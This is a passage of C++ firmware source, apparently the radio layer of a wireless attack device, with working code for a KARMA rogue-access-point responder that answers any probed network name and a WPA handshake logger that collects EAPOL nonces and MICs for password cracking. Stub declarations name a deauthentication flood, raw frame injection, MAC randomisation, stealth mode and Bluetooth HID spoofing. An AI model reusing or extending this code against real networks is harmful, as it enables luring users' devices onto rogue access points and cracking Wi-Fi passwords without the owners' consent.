    std::memset(resp, 0, sizeof(resp));
    resp[0] = 0x50; resp[1] = 0x00;               // probe response
    resp[2] = 0x00; resp[3] = 0x00;
    std::memcpy(resp + 4,  mframe + 10, 6);        // DA = probe SA
    std::memcpy(resp + 10, mframe + 10, 6);        // SA
    std::memcpy(resp + 16, mframe + 10, 6);        // BSSID
    size_t off = 24;
    if (ssid_len > 32) ssid_len = 32;
    resp[off++] = 0x00; resp[off++] = (uint8_t)ssid_len;
    if (ssid_len) { std::memcpy(resp + off, ssid, ssid_len); off += ssid_len; }
    resp[off++] = 0x01; resp[off++] = 0x04;        // supported rates
    resp[off++] = 0x82; resp[off++] = 0x84;
    resp[off++] = 0x8b; resp[off++] = 0x96;
    raw_inject(resp, off, true);
}

// ─────────────────────────────────────────────────────────────────────────
// hal_wifi_tick — dispatch capture → handshake logger + KARMA responder
// ─────────────────────────────────────────────────────────────────────────

void hal_wifi_tick() {
    scan_drain_results();
    if (!g_handler_started && !g_karma) return;
    if (g_cap_fd < 0) return;

    uint8_t buf[2048];
    for (int i = 0; i < 8; ++i) {
        ssize_t n = ::recv(g_cap_fd, buf, sizeof(buf), MSG_DONTWAIT);
        if (n < 0) break;
        if (n < 24) continue;
        int8_t rssi_i = 0; uint8_t ch_i = 0;
        uint16_t rtap = parse_radiotap(buf, (size_t)n, &rssi_i, &ch_i);
        if (rtap == 0 || rtap + 4 >= (size_t)n) continue;
        const uint8_t *fc = buf + rtap;
        size_t mlen = (size_t)n - rtap;
        uint8_t ft = vosrad::frame_type(fc);

        // ── Handshake logger ──
        if (g_handler_started && (ft == (vosrad::FC_TYPE_DATA << 2))) {
            // An EAPOL-Key frame arrives inside an LLC/SNAP payload:
            //   24-byte 802.11 data header (+ QoS 2 bytes if set) then
            //   LLC(AA AA 03 00 00 00) + EtherType(88 8E) + EAPOL PDU.
            // Locate the 88 8E EtherType, then hand the EAPOL PDU (whose
            // 4-byte header holds version/type/length) to the parser.
            size_t scan_end = mlen < 64 ? mlen : 64;
            for (size_t i = 30; i + 2 <= scan_end; ++i) {
                if (fc[i] == 0x88 && fc[i + 1] == 0x8e) {
                    size_t eapol_pdu = i + 2;      // skip EtherType
                    if (eapol_pdu + 4 > mlen) break;
                    WifiHandshake h{};
                    int desc = process_eapol_key(fc, mlen, eapol_pdu, h);
                    if (desc > 0) {
                        const uint8_t *sa = fc + 10;     // addr2 = SA (AP)
                        const uint8_t *da = fc + 4;      // addr1 = DA (STA)
                        Hsq *s = hsq_find(sa, da);
                        if (s) {
                            s->msgs |= h.eapol_frames;
                            if (desc == 1) std::memcpy(s->anonce, h.anonce, 32);
                            if (desc == 2) std::memcpy(s->snonce, h.snonce, 32);
                            if (desc == 4) std::memcpy(s->mic, h.mic, 16);
                            g_hsq_dirty = true;
                        }
                    }
                    break;
                }
            }
        }

        // ── KARMA ──
        if (g_karma &&
            vosrad::frame_subtype(fc) == vosrad::FC_ST_PROBE_REQ) {
            char ssid[33];
            const uint8_t *ies = fc + 24;
            size_t ilen = mlen > 24 ? mlen - 24 : 0;
            if (ie_ssid(ies, ilen, ssid, sizeof(ssid)))
                karma_respond(fc, mlen, ssid, std::strlen(ssid));
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────
// BLE — raw HCI (honest-unavailable for full profiles)
// ─────────────────────────────────────────────────────────────────────────

bool hal_ble_scan_start(bool passive_only) {
    if (g_hci_fd < 0) g_hci_fd = ::open("/dev/hci0", O_RDWR | O_NONBLOCK);
    if (g_hci_fd < 0) return false;
    (void)passive_only;
    g_ble_scan_active = true;
    return true;
}
bool hal_ble_scan_step(BleAdvRecord *) { return false; }
uint16_t hal_ble_scan_count() { return g_ble_scan_active ? 0 : 0; }
void hal_ble_scan_stop() { g_ble_scan_active = false; }

bool hal_ble_hid_advertise_start(const char *) { return false; }
bool hal_ble_hid_send_report(const uint8_t *)  { return false; }
void hal_ble_hid_advertise_stop() {}

bool hal_ble_gatt_enumerate(uint8_t [6], GattDevice *) { return false; }
bool hal_ble_gatt_read (uint8_t [6], uint16_t, uint8_t *, uint8_t *) { return false; }
bool hal_ble_gatt_write(uint8_t [6], uint16_t, const uint8_t *, uint8_t) { return false; }

bool hal_ble_advertise_custom(const uint8_t *param, size_t param_len, int8_t) {
    if (!param || param_len > 31) return false;
    return param_len <= 31;
}
void hal_ble_advertise_stop() {}

// ─────────────────────────────────────────────────────────────────────────
// Test surface (compile with -DHAL_WIFI_ENABLE_TESTS, no radio needed)
// ─────────────────────────────────────────────────────────────────────────

#ifdef HAL_WIFI_ENABLE_TESTS
int vos_parse_radiotap(const uint8_t *d, size_t len, int8_t *rssi, uint8_t *chan) {
    return (int)parse_radiotap(d, len, rssi, chan);
}
int vos_probe_ssid(const uint8_t *ies, size_t len, char *out, size_t out_sz) {
    return ie_ssid(ies, len, out, out_sz) ? 1 : 0;
}
int vos_eapol_desc(const uint8_t *d, size_t len, size_t off, WifiHandshake *o) {
    return process_eapol_key(d, len, off, *o);
}
uint8_t vos_frame_type(const uint8_t *fc) { return vosrad::frame_type(fc); }
uint8_t vos_frame_subtype(const uint8_t *fc) { return vosrad::frame_subtype(fc); }
void vos_set_deauth_cb(void (*cb)(const uint8_t [6], const uint8_t [6])) {
    g_cb_on_deauth = cb;
}
#endif

#else  // !VOIDOS_RPI5 — honest ESP32 stubs.

void hal_wifi_init() {}
void hal_wifi_tick() {}
uint8_t hal_wifi_capabilities() { return 0; }
bool hal_wifi_set_mode_monitor()         { return false; }
bool hal_wifi_set_mode_station()         { return false; }
bool hal_wifi_set_mode_ap(const char *, uint8_t, bool) { return false; }
bool hal_wifi_set_stealth(bool)          { return false; }
bool hal_wifi_is_stealth()               { return false; }
void hal_wifi_get_mac(uint8_t out[6])    { std::memset(out, 0, 6); }
void hal_wifi_randomize_mac()            {}
bool hal_wifi_scan_start()               { return false; }
bool hal_wifi_scan_step(WifiApRecord *)  { return false; }
uint16_t hal_wifi_scan_count()           { return 0; }
bool hal_wifi_capture_consume(WifiFrame *) { return false; }
bool hal_wifi_handshake_capture_start()  { return false; }
bool hal_wifi_handshake_step(WifiHandshake *) { return false; }
void hal_wifi_handshake_capture_stop()   {}
bool hal_ble_scan_start(bool)            { return false; }
bool hal_ble_scan_step(BleAdvRecord *)   { return false; }
uint16_t hal_ble_scan_count()            { return 0; }
void hal_ble_scan_stop()                 {}
bool hal_ble_hid_advertise_start(const char *) { return false; }
bool hal_ble_hid_send_report(const uint8_t *)  { return false; }
void hal_ble_hid_advertise_stop()             {}
bool hal_ble_gatt_enumerate(uint8_t [6], GattDevice *) { return false; }
bool hal_ble_gatt_read (uint8_t [6], uint16_t, uint8_t *, uint8_t *) { return false; }
bool hal_ble_gatt_write(uint8_t [6], uint16_t, const uint8_t *, uint8_t) { return false; }
bool hal_wifi_inject_frame(const uint8_t *, size_t, uint16_t) { return false; }
bool hal_wifi_deauth_flood(const uint8_t [6], const uint8_t [6], uint16_t, uint16_t) { return false; }
bool hal_wifi_karma_start() { return false; }
void hal_wifi_karma_stop() {}
bool hal_ble_advertise_custom(const uint8_t *, size_t, int8_t) { return false; }
void hal_ble_advertise_stop() {}

#endif // VOIDOS_RPI5